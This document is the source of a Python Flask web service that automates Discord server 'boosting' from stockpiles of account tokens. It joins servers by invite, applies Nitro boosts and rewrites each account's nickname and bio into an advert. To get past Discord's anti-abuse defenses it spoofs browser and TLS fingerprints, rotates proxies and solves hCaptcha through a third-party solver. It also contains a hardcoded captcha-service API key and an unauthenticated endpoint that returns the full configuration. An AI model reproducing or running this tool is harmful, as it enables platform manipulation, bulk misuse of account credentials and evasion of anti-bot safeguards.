from flask import Flask, request, jsonify, render_template_string
import threading
import time
import json
import os
import logging
import random
import httpx
from colorama import init, Fore, Style
import fade
import base64
import datetime
from pathlib import Path
import tls_client
import sys

# Initialize colorama
init()

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Load configuration
try:
    config = json.load(open("config.json", encoding="utf-8"))
except FileNotFoundError:
    config = {
        "capsolver_key": "CAP-F07D1B94AA95CC75D97FADEA88C18299",
        "proxyless": True,
        "change_server_nick": True,
        "change_server_bio": True,
        "bio": "https://discord.gg/axo",
        "nickname": ".gg/axo",
        "license_key": "",
        "port": 5000,
        "host": "0.0.0.0"
    }
    with open("config.json", "w") as f:
        json.dump(config, f, indent=4)

# Load fingerprints
try:
    fingerprints = json.load(open("fingerprints.json", encoding="utf-8"))
except:
    fingerprints = []

# Your existing classes and functions
class Fore:
    BLACK  = '\033[30m'
    RED    = '\033[31m'
    GREEN  = '\033[32m'
    YELLOW = '\033[33m'
    BLUE   = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN   = '\033[36m'
    WHITE  = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET  = '\033[0m'
    ARROW = '\u25BA'

class Log:
    STATUS = "N/A"

class variables:
    joins = 0
    boosts_done = 0
    success_tokens = []
    failed_tokens = []

client_identifiers = ['safari_ios_16_0', 'safari_ios_15_6', 'safari_ios_15_5', 'safari_16_0', 'safari_15_6_1', 'safari_15_3', 'opera_90', 'opera_89', 'firefox_104', 'firefox_102']

# Global variables for web service
boost_tasks = {}
task_id_counter = 0

def writeToLogFile(message):
    f = open("log_file.txt", "w")
    f.write(f"{datetime.datetime.now().strftime('%H:%M:%S')} ~ {message}\n")
    f.close()
    Log.STATUS = message

def timestamp():
    timestamp = f"{Fore.RESET}{Style.BRIGHT}{Fore.WHITE}{datetime.datetime.now().strftime('%H:%M:%S')}{Fore.RESET}"
    return timestamp

def checkEmpty(filename):
    mypath = Path(filename)
    if mypath.stat().st_size == 0:
        return True
    else:
        return False

def getinviteCode(invite_input):
    if "discord.gg" not in invite_input:
        return invite_input
    if "discord.gg" in invite_input:
        invite = invite_input.split("discord.gg/")[1]
        return invite
    if "https://discord.gg" in invite_input:
        invite = invite_input.split("https://discord.gg/")[1]
        return invite
    if "invite" in invite_input:
        invite = invite_input.split("/invite/")[1]
        return invite

def validateInvite(invite:str):
    client = httpx.Client()
    if 'type' in client.get(f'https://discord.com/api/v10/invites/{invite}?inputValue={invite}&with_counts=true&with_expiration=true').text:
        return True
    else:
        return False

def sprint(message, type:bool):
    if type == True:
        print(f"{timestamp()} {Style.BRIGHT}{Fore.YELLOW}INF {Fore.BLACK}> {Fore.WHITE}{message}{Fore.RESET}{Style.RESET_ALL}")
    if type == False:
        print(f"{timestamp()} {Style.BRIGHT}{Fore.RED}ERR {Fore.BLACK}> {Fore.WHITE}{message}{Fore.RESET}{Style.RESET_ALL}")

def get_all_tokens(filename:str):
    all_tokens = []
    for j in open(filename, "r").read().splitlines():
        if ":" in j:
            j = j.split(":")[2]
            all_tokens.append(j)
        else:
            all_tokens.append(j)
    return all_tokens

def remove(token: str, filename:str):
    tokens = get_all_tokens(filename)
    if token in tokens:
        tokens.pop(tokens.index(token))
        f = open(filename, "w")
        for l in tokens:
            f.write(f"{l}\n")
        f.close()

def getproxy():
    try:
        proxy = random.choice(open("input/proxies.txt", "r").read().splitlines())
        return {'http': f'http://{proxy}'}
    except Exception as e:
        return None

def get_fingerprint(thread):
    try:
        fingerprint = httpx.get(f"https://discord.com/api/v10/experiments", proxies = {'http://': f'http://{random.choice(open("input/proxies.txt", "r").read().splitlines())}', 'https://': f'http://{random.choice(open("input/proxies.txt", "r").read().splitlines())}'} if config['proxyless'] != True else None)
        return fingerprint.json()['fingerprint']
    except Exception as e:
        return None

def get_cookies(x, useragent, thread):
    try:
        response = httpx.get('https://discord.com/api/v10/experiments', headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer':'https://discord.com',
            'sec-ch-ua': f'"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="8"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': useragent, 
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-super-properties': x
        }, proxies = {'http://': f'http://{random.choice(open("input/proxies.txt", "r").read().splitlines())}', 'https://': f'http://{random.choice(open("input/proxies.txt", "r").read().splitlines())}'} if config['proxyless'] != True else None)
        cookie = f"locale=en; __dcfduid={response.cookies.get('__dcfduid')}; __sdcfduid={response.cookies.get('__sdcfduid')}; __cfruid={response.cookies.get('__cfruid')}"
        return cookie
    except Exception as e:
        return ""

def get_headers(token, thread):
    x = fingerprints[random.randint(0, (len(fingerprints)-1))]['x-super-properties']
    useragent = fingerprints[random.randint(0, (len(fingerprints)-1))]['useragent']
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': token,
        'content-type': 'application/json',
        'origin': 'https://discord.com',
        'referer':'https://discord.com',
        'sec-ch-ua': f'"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="8"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'cookie': get_cookies(x, useragent, thread),
        'sec-fetch-site': 'same-origin',
        'user-agent': useragent,
        'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjY3OTg3NTk0NjU5NzA1NjY4MyIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiIxMDM1ODkyMzI4ODg5NTk0MDM2IiwibG9jYXRpb25fY2hhbm5lbF90eXBlIjowfQ==',
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-super-properties': x,
        'fingerprint': get_fingerprint(thread)
    }
    return headers, useragent

def get_captcha_key(rqdata: str, site_key: str, websiteURL: str, useragent: str):
    task_payload = {
        'clientKey': config['capsolver_key'],
        'task': {
            "type": "HCaptchaTaskProxyless",
            "isInvisible": True,
            "data": rqdata,
            "websiteURL": websiteURL,
            "websiteKey": site_key,
            "userAgent": useragent
        }
    }
    key = None
    with httpx.Client(headers={'content-type': 'application/json', 'accept': 'application/json'}, timeout=30) as client:   
        task_id = client.post(f'https://capsolver.com/createTask', json=task_payload).json()['taskId']
        get_task_payload = {
            'clientKey': config['capsolver_key'],
            'taskId': task_id,
        }
        
        while key is None:
            response = client.post("https://capsolver.com/getTaskResult", json=get_task_payload).json()
            if response['status'] == "ready":
                key = response["solution"]["gRecaptchaResponse"]
            else:
                time.sleep(1)
    return key

def join_server(session, headers, useragent, invite, token, thread):
    join_outcome = False
    guild_id = 0
    try:
        for i in range(10):
            response = session.post(f'https://discord.com/api/v9/invites/{invite}', json={}, headers=headers)
            if response.status_code == 429:
                time.sleep(5)
                continue
            elif response.status_code in [200, 204]:
                join_outcome = True
                guild_id = response.json()["guild"]["id"]
                break
            elif "captcha_rqdata" in response.text:
                r = response.json()
                solution = get_captcha_key(rqdata=r['captcha_rqdata'], site_key=r['captcha_sitekey'], websiteURL="https://discord.com", useragent=useragent)
                response = session.post(f'https://discord.com/api/v9/invites/{invite}', json={'captcha_key': solution,'captcha_rqtoken': r['captcha_rqtoken']}, headers=headers)
                if response.status_code in [200, 204]:
                    join_outcome = True
                    guild_id = response.json()["guild"]["id"]
                    break
        return join_outcome, guild_id
    except Exception as e:
        return False, 0

def put_boost(session, headers, guild_id, boost_id):
    try:
        payload = {"user_premium_guild_subscription_slot_ids": [boost_id]}
        boosted = session.put(f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions", json=payload, headers=headers)
        if boosted.status_code == 201:
            return True
        elif 'Must wait for premium server subscription cooldown to expire' in boosted.text:
            return False
        return False
    except Exception as e:
        return False

def change_guild_name(session, headers, server_id, nick):
    try:
        jsonPayload = {"nick": nick}
        r = session.patch(f"https://discord.com/api/v9/guilds/{server_id}/members/@me", headers=headers, json=jsonPayload)
        return r.status_code == 200
    except Exception as e:
        return False

def change_guild_bio(session, headers, server_id, bio):
    try:
        jsonPayload = {"bio": bio}
        r = session.patch(f"https://discord.com/api/v9/guilds/{server_id}/members/@me", headers=headers, json=jsonPayload)
        return r.status_code == 200
    except Exception as e:
        return False

def boost_server(invite:str, months:int, token:str, thread:int, nick: str, bio: str, task_id: int):
    global boost_tasks
    
    if months == 1:
        filename = "input/1m_tokens.txt"
    if months == 3:
        filename = "input/3m_tokens.txt"
    
    try:
        session = tls_client.Session(
            ja3_string=fingerprints[random.randint(0, (len(fingerprints)-1))]['ja3'], 
            client_identifier=random.choice(client_identifiers)
        )
        
        if config['proxyless'] == False and len(open("input/proxies.txt", "r").readlines()) != 0:
            proxy = getproxy()
            if proxy:
                session.proxies.update(proxy)

        headers, useragent = get_headers(token, thread)
        boost_data = session.get(f"https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)

        if "401: Unauthorized" in boost_data.text:
            boost_tasks[task_id]['failed_tokens'].append(token)
            remove(token, filename)
            return
            
        if "You need to verify your account in order to perform this action." in boost_data.text:
            boost_tasks[task_id]['failed_tokens'].append(token)
            remove(token, filename)
            return
            
        if boost_data.status_code == 200:
            join_outcome, guild_id = join_server(session, headers, useragent, invite, token, thread)
            if join_outcome:
                boost_tasks[task_id]['success_tokens'].append(token)
                for boost in boost_data.json():
                    boost_id = boost["id"]
                    boosted = put_boost(session, headers, guild_id, boost_id)
                    if boosted:
                        boost_tasks[task_id]['boosts_done'] += 1
                
                remove(token, filename)
                
                if config["change_server_nick"]:
                    change_guild_name(session, headers, guild_id, nick)
                    
                if config["change_server_bio"]:
                    change_guild_bio(session, headers, guild_id, bio)
            else:
                boost_tasks[task_id]['failed_tokens'].append(token)
                                        
    except Exception as e:
        boost_tasks[task_id]['failed_tokens'].append(token)

def thread_boost_wrapper(task_id, invite, amount, months, nick, bio):
    """Wrapper function for web service integration"""
    global boost_tasks
    
    try:
        boost_tasks[task_id]['status'] = 'running'
        boost_tasks[task_id]['start_time'] = time.time()
        boost_tasks[task_id]['boosts_done'] = 0
        boost_tasks[task_id]['success_tokens'] = []
        boost_tasks[task_id]['failed_tokens'] = []
        
        if validateInvite(invite) == False:
            boost_tasks[task_id]['status'] = 'error'
            boost_tasks[task_id]['message'] = "Invalid invite code"
            return False
            
        if months == 1:
            filename = "input/1m_tokens.txt"
        if months == 3:
            filename = "input/3m_tokens.txt"
            
        while boost_tasks[task_id]['boosts_done'] < amount:
            if boost_tasks[task_id]['status'] == 'cancelled':
                break
                
            tokens = get_all_tokens(filename)
            
            if boost_tasks[task_id]['boosts_done'] % 2 != 0:
                boost_tasks[task_id]['boosts_done'] -= 1
                
            numTokens = int((amount - boost_tasks[task_id]['boosts_done'])/2)
            if len(tokens) == 0 or len(tokens) < numTokens:
                boost_tasks[task_id]['status'] = 'error'
                boost_tasks[task_id]['message'] = f"Not enough {months} month(s) tokens' stock left"
                return False
            
            threads = []
            for i in range(numTokens):
                token = tokens[i]
                thread_num = i + 1
                t = threading.Thread(
                    target=boost_server, 
                    args=(invite, months, token, thread_num, nick, bio, task_id)
                )
                t.daemon = True
                threads.append(t)
                
            for i in range(numTokens):
                threads[i].start()
                
            for i in range(numTokens):
                threads[i].join()
                
            # Update progress
            boost_tasks[task_id]['progress'] = boost_tasks[task_id]['boosts_done']
            boost_tasks[task_id]['message'] = f"Progress: {boost_tasks[task_id]['boosts_done']}/{amount} boosts completed"
            
        boost_tasks[task_id]['status'] = 'completed'
        boost_tasks[task_id]['end_time'] = time.time()
        boost_tasks[task_id]['message'] = f"Completed {boost_tasks[task_id]['boosts_done']}/{amount} boosts successfully"
        return True
        
    except Exception as e:
        boost_tasks[task_id]['status'] = 'error'
        boost_tasks[task_id]['message'] = f"Unexpected error: {str(e)}"
        return False

def get_stock():
    """Get token stock information"""
    try:
        tokens_1m = len(open("input/1m_tokens.txt", "r").readlines())
    except:
        tokens_1m = 0
        os.makedirs("input", exist_ok=True)
        open("input/1m_tokens.txt", "a").close()
        
    try:
        tokens_3m = len(open("input/3m_tokens.txt", "r").readlines())
    except:
        tokens_3m = 0
        open("input/3m_tokens.txt", "a").close()
    
    return {
        '1m_tokens': tokens_1m,
        '1m_boosts': tokens_1m * 2,
        '3m_tokens': tokens_3m,
        '3m_boosts': tokens_3m * 2,
        'total_fingerprints': len(fingerprints),
        'capsolver_enabled': bool(config.get('capsolver_key')),
        'auto_bio': config.get('change_server_bio', True),
        'auto_nickname': config.get('change_server_nick', True)
    }

# HTML Template (same as before)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Advanced Discord Boosting Service</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; background: #36393f; color: #dcddde; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { background: #2f3136; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        .command-interface { background: #2f3136; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
        .command-input { display: flex; align-items: center; background: #40444b; border-radius: 8px; padding: 10px; }
        .slash { color: #7289da; font-size: 20px; margin-right: 8px; }
        .command-field { flex: 1; background: transparent; border: none; color: white; font-size: 16px; outline: none; }
        .suggestions { background: #40444b; border-radius: 8px; margin-top: 10px; padding: 10px; display: none; }
        .suggestion { padding: 8px 12px; cursor: pointer; border-radius: 4px; }
        .suggestion:hover { background: #484c52; }
        .command-card { background: #2f3136; border-radius: 8px; padding: 15px; margin: 10px 0; border-left: 4px solid #7289da; }
        .response-card { background: #2f3136; border-radius: 8px; padding: 15px; margin: 10px 0; border-left: 4px solid #43b581; }
        .error-card { background: #2f3136; border-radius: 8px; padding: 15px; margin: 10px 0; border-left: 4px solid #f04747; }
        .task-card { background: #2f3136; border-radius: 8px; padding: 15px; margin: 10px 0; }
        .status-running { color: #faa61a; }
        .status-completed { color: #43b581; }
        .status-error { color: #f04747; }
        .status-pending { color: #7289da; }
        .stock-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 15px; margin: 15px 0; }
        .stock-item { background: #40444b; padding: 15px; border-radius: 8px; text-align: center; }
        .btn { background: #7289da; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin: 5px; }
        .btn:hover { background: #677bc4; }
        .btn-danger { background: #f04747; }
        .btn-danger:hover { background: #d84040; }
        .progress-bar { width: 100%; background: #40444b; border-radius: 10px; overflow: hidden; margin: 10px 0; }
        .progress-fill { height: 20px; background: #43b581; transition: width 0.3s; }
        .task-details { background: #40444b; padding: 10px; border-radius: 5px; margin: 5px 0; }
        .fingerprint-info { font-size: 12px; color: #b9bbbe; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🛡️ Advanced Discord Boosting Service</h1>
            <p>Advanced fingerprint rotation • Capsolver Integration • Auto Profile Setup</p>
        </div>

        <!-- Slash Command Interface -->
        <div class="command-interface">
            <div class="command-input">
                <span class="slash">/</span>
                <input type="text" class="command-field" id="commandInput" placeholder="Type a command..." autocomplete="off">
            </div>
            <div class="suggestions" id="suggestions">
                <div class="suggestion" onclick="useSuggestion('boost')">boost - Start boosting a server</div>
                <div class="suggestion" onclick="useSuggestion('stock')">stock - Check token inventory</div>
                <div class="suggestion" onclick="useSuggestion('tasks')">tasks - View active tasks</div>
                <div class="suggestion" onclick="useSuggestion('cancel')">cancel - Cancel a task</div>
                <div class="suggestion" onclick="useSuggestion('fingerprints')">fingerprints - Show available fingerprints</div>
                <div class="suggestion" onclick="useSuggestion('config')">config - Show current configuration</div>
                <div class="suggestion" onclick="useSuggestion('help')">help - Show all commands</div>
            </div>
        </div>

        <!-- Command Output Area -->
        <div id="commandOutput"></div>

        <!-- System Status -->
        <div class="task-card">
            <h3>📊 System Status</h3>
            <div class="stock-grid">
                <div class="stock-item">
                    <h4>1 Month Nitro</h4>
                    <p>Tokens: {{ stock.1m_tokens }}</p>
                    <p>Boosts: {{ stock.1m_boosts }}</p>
                </div>
                <div class="stock-item">
                    <h4>3 Month Nitro</h4>
                    <p>Tokens: {{ stock.3m_tokens }}</p>
                    <p>Boosts: {{ stock.3m_boosts }}</p>
                </div>
                <div class="stock-item">
                    <h4>Fingerprints</h4>
                    <p>Available: {{ stock.total_fingerprints }}</p>
                    <p>Status: 🟢 Active</p>
                </div>
                <div class="stock-item">
                    <h4>Capsolver</h4>
                    <p>Status: {{ '🟢 Enabled' if stock.capsolver_enabled else '🔴 Disabled' }}</p>
                    <p>Auto-Bio: {{ '✅' if stock.auto_bio else '❌' }}</p>
                    <p>Auto-Nick: {{ '✅' if stock.auto_nickname else '❌' }}</p>
                </div>
            </div>
        </div>

        <!-- Active Tasks -->
        <div class="task-card">
            <h3>🔄 Active Tasks</h3>
            <div id="tasksList">
                {% for task_id, task in tasks.items() %}
                <div class="command-card">
                    <strong>Task #{{ task_id }}</strong> | 
                    <span class="status-{{ task.status }}">{{ task.status.upper() }}</span>
                    <div class="task-details">
                        <p>Server: {{ task.invite }} | Progress: {{ task.progress }}/{{ task.amount }}</p>
                        <p>Successful: {{ task.boosts_done }} | Failed Tokens: {{ task.failed_tokens|length }}</p>
                        {% if task.status == 'running' %}
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: {{ (task.progress / task.amount * 100) | round }}%"></div>
                        </div>
                        {% endif %}
                        <small>{{ task.message }}</small>
                    </div>
                </div>
                {% endfor %}
            </div>
        </div>
    </div>

    <script>
        // JavaScript code remains the same as previous version
        const commandInput = document.getElementById('commandInput');
        const suggestions = document.getElementById('suggestions');
        const commandOutput = document.getElementById('commandOutput');

        const commands = {
            'boost': {
                description: 'Start boosting a server',
                usage: '/boost <invite> <amount> <months>',
                example: '/boost discord.gg/server 10 3',
                execute: (args) => executeBoost(args)
            },
            'stock': {
                description: 'Check token inventory',
                usage: '/stock',
                execute: () => executeStock()
            },
            'tasks': {
                description: 'View active tasks',
                usage: '/tasks',
                execute: () => executeTasks()
            },
            'cancel': {
                description: 'Cancel a task',
                usage: '/cancel <task_id>',
                example: '/cancel 1',
                execute: (args) => executeCancel(args)
            },
            'fingerprints': {
                description: 'Show available fingerprints',
                usage: '/fingerprints',
                execute: () => executeFingerprints()
            },
            'config': {
                description: 'Show current configuration',
                usage: '/config',
                execute: () => executeConfig()
            },
            'help': {
                description: 'Show all commands',
                usage: '/help',
                execute: () => executeHelp()
            }
        };

        commandInput.addEventListener('input', showSuggestions);
        commandInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') executeCommand();
        });

        function showSuggestions() {
            const input = commandInput.value.toLowerCase();
            suggestions.style.display = input.startsWith('/') ? 'block' : 'none';
        }

        function useSuggestion(command) {
            commandInput.value = '/' + command;
            suggestions.style.display = 'none';
            commandInput.focus();
        }

        function executeCommand() {
            const input = commandInput.value.trim();
            if (!input.startsWith('/')) {
                showResponse('error', 'Commands must start with /');
                return;
            }

            const parts = input.slice(1).split(' ');
            const commandName = parts[0].toLowerCase();
            const args = parts.slice(1);

            if (commands[commandName]) {
                commands[commandName].execute(args);
            } else {
                showResponse('error', `Unknown command: ${commandName}. Type /help for available commands.`);
            }
            commandInput.value = '';
        }

        function executeBoost(args) {
            if (args.length < 3) {
                showResponse('error', 'Usage: /boost <invite> <amount> <months>');
                return;
            }

            const [invite, amount, months] = args;
            fetch('/api/boost', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ invite, amount: parseInt(amount), months: parseInt(months) })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showResponse('success', `🚀 Boost started! Task ID: ${data.task_id}`);
                    refreshTasks();
                } else {
                    showResponse('error', data.error || 'Failed to start boost');
                }
            })
            .catch(error => showResponse('error', 'Network error: ' + error));
        }

        function executeStock() {
            fetch('/api/stock').then(r => r.json()).then(data => {
                const stockInfo = `
                    <div class="stock-grid">
                        <div class="stock-item"><h4>1 Month Nitro</h4><p>Tokens: ${data['1m_tokens']}</p><p>Boosts: ${data['1m_boosts']}</p></div>
                        <div class="stock-item"><h4>3 Month Nitro</h4><p>Tokens: ${data['3m_tokens']}</p><p>Boosts: ${data['3m_boosts']}</p></div>
                        <div class="stock-item"><h4>Fingerprints</h4><p>Available: ${data['total_fingerprints']}</p><p>Status: 🟢 Active</p></div>
                        <div class="stock-item"><h4>Capsolver</h4><p>Status: ${data.capsolver_enabled ? '🟢 Enabled' : '🔴 Disabled'}</p><p>Auto-Bio: ${data.auto_bio ? '✅' : '❌'}</p><p>Auto-Nick: ${data.auto_nickname ? '✅' : '❌'}</p></div>
                    </div>`;
                showResponse('info', `📊 System Status${stockInfo}`);
            });
        }

        function executeConfig() {
            fetch('/api/config').then(r => r.json()).then(data => {
                let configHtml = '<h4>Current Configuration:</h4>';
                for (const [key, value] of Object.entries(data.config)) {
                    if (key === 'capsolver_key' && value) {
                        configHtml += `<div class="command-card"><strong>${key}:</strong> ${value.substring(0, 10)}...${value.substring(value.length-10)}</div>`;
                    } else {
                        configHtml += `<div class="command-card"><strong>${key}:</strong> ${value}</div>`;
                    }
                }
                showResponse('info', configHtml);
            });
        }

        function executeTasks() {
            fetch('/api/tasks').then(r => r.json()).then(data => {
                let tasksHtml = '';
                for (const [taskId, task] of Object.entries(data)) {
                    const progressPercent = Math.round((task.progress / task.amount) * 100);
                    tasksHtml += `
                        <div class="command-card">
                            <strong>Task #${taskId}</strong> | 
                            <span class="status-${task.status}">${task.status.toUpperCase()}</span>
                            <div class="task-details">
                                <p>Server: ${task.invite} | Progress: ${task.progress}/${task.amount}</p>
                                <p>Successful: ${task.boosts_done} | Failed Tokens: ${task.failed_tokens.length}</p>
                                ${task.status === 'running' ? `
                                <div class="progress-bar">
                                    <div class="progress-fill" style="width: ${progressPercent}%"></div>
                                </div>` : ''}
                                <small>${task.message}</small>
                            </div>
                        </div>`;
                }
                showResponse('info', `🔄 Active Tasks${tasksHtml || '<p>No active tasks</p>'}`);
            });
        }

        function executeFingerprints() {
            fetch('/api/fingerprints').then(r => r.json()).then(data => {
                let fingerprintsHtml = '<h4>Available Fingerprints:</h4>';
                data.fingerprints.forEach((fp, index) => {
                    fingerprintsHtml += `
                        <div class="command-card">
                            <strong>Fingerprint #${index + 1}</strong>
                            <p><small>User Agent: ${fp.useragent}</small></p>
                            <p><small>JA3: ${fp.ja3.substring(0, 50)}...</small></p>
                        </div>`;
                });
                showResponse('info', fingerprintsHtml);
            });
        }

        function executeCancel(args) {
            if (args.length < 1) {
                showResponse('error', 'Usage: /cancel <task_id>');
                return;
            }
            const taskId = args[0];
            fetch(`/api/cancel/${taskId}`, { method: 'POST' })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        showResponse('success', '✅ Task cancelled successfully');
                        refreshTasks();
                    } else {
                        showResponse('error', data.error || 'Failed to cancel task');
                    }
                });
        }

        function executeHelp() {
            let helpText = '<h4>Available Commands:</h4>';
            for (const [cmd, info] of Object.entries(commands)) {
                helpText += `
                    <div class="command-card">
                        <strong>/${cmd}</strong> - ${info.description}
                        <p><small>Usage: ${info.usage}</small></p>
                        ${info.example ? `<p><small>Example: ${info.example}</small></p>` : ''}
                    </div>`;
            }
            showResponse('info', helpText);
        }

        function showResponse(type, content) {
            const responseDiv = document.createElement('div');
            responseDiv.className = type === 'error' ? 'error-card' : 'response-card';
            responseDiv.innerHTML = content;
            commandOutput.prepend(responseDiv);
        }

        function refreshTasks() {
            setTimeout(() => location.reload(), 2000);
        }

        commandInput.focus();
        setInterval(() => {
            if (Object.keys({{ tasks|tojson }}).length > 0) {
                location.reload();
            }
        }, 5000);
    </script>
</body>
</html>
'''

# API Routes
@app.route('/')
def home():
    """Main web interface with slash commands"""
    stock = get_stock()
    return render_template_string(HTML_TEMPLATE, stock=stock, tasks=boost_tasks)

@app.route('/api/boost', methods=['POST'])
def api_boost():
    """API endpoint for boost command"""
    global task_id_counter
    
    try:
        data = request.get_json()
        invite = data.get('invite')
        amount = int(data.get('amount', 1))
        months = int(data.get('months', 1))
        
        if not invite:
            return jsonify({"success": False, "error": "Invite is required"}), 400
        
        invite_code = getinviteCode(invite)
        task_id = task_id_counter
        task_id_counter += 1
        
        # Create task
        boost_tasks[task_id] = {
            'invite': invite_code,
            'amount': amount,
            'months': months,
            'progress': 0,
            'status': 'pending',
            'message': 'Task created with your boosting logic',
            'start_time': None,
            'end_time': None,
            'boosts_done': 0,
            'success_tokens': [],
            'failed_tokens': []
        }
        
        # Start boosting in background thread using your existing logic
        thread = threading.Thread(
            target=thread_boost_wrapper,
            args=(task_id, invite_code, amount, months, config['nickname'], config["bio"])
        )
        thread.daemon = True
        thread.start()
        
        return jsonify({
            "success": True,
            "task_id": task_id,
            "message": f"Boost started for {invite_code} using advanced boosting logic"
        })
        
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/stock')
def api_stock():
    """API endpoint for stock command"""
    return jsonify(get_stock())

@app.route('/api/tasks')
def api_tasks():
    """API endpoint for tasks command"""
    return jsonify(boost_tasks)

@app.route('/api/fingerprints')
def api_fingerprints():
    """API endpoint for fingerprints command"""
    return jsonify({"fingerprints": fingerprints})

@app.route('/api/config')
def api_config():
    """API endpoint for config command"""
    return jsonify({"config": config})

@app.route('/api/cancel/<int:task_id>', methods=['POST'])
def api_cancel(task_id):
    """API endpoint for cancel command"""
    if task_id in boost_tasks:
        boost_tasks[task_id]['status'] = 'cancelled'
        boost_tasks[task_id]['message'] = 'Task cancelled by user'
        return jsonify({"success": True, "message": "Task cancelled"})
    return jsonify({"success": False, "error": "Task not found"}), 404

@app.route('/api/help')
def api_help():
    """API endpoint for help command"""
    commands_info = {
        'boost': 'Start boosting a server - /boost <invite> <amount> <months>',
        'stock': 'Check token inventory - /stock',
        'tasks': 'View active tasks - /tasks',
        'cancel': 'Cancel a task - /cancel <task_id>',
        'fingerprints': 'Show available fingerprints - /fingerprints',
        'config': 'Show current configuration - /config',
        'help': 'Show this help message - /help'
    }
    return jsonify(commands_info)

@app.route('/health')
def health():
    """Health check endpoint for Render"""
    return jsonify({
        "status": "healthy", 
        "timestamp": time.time(),
        "fingerprints_available": len(fingerprints),
        "capsolver_enabled": bool(config.get('capsolver_key')),
        "active_tasks": len([t for t in boost_tasks.values() if t['status'] == 'running'])
    })

if __name__ == "__main__":
    port = int(os.environ.get("PORT", config.get('port', 5000)))
    app.run(host=config.get('host', '0.0.0.0'), port=port, debug=False)
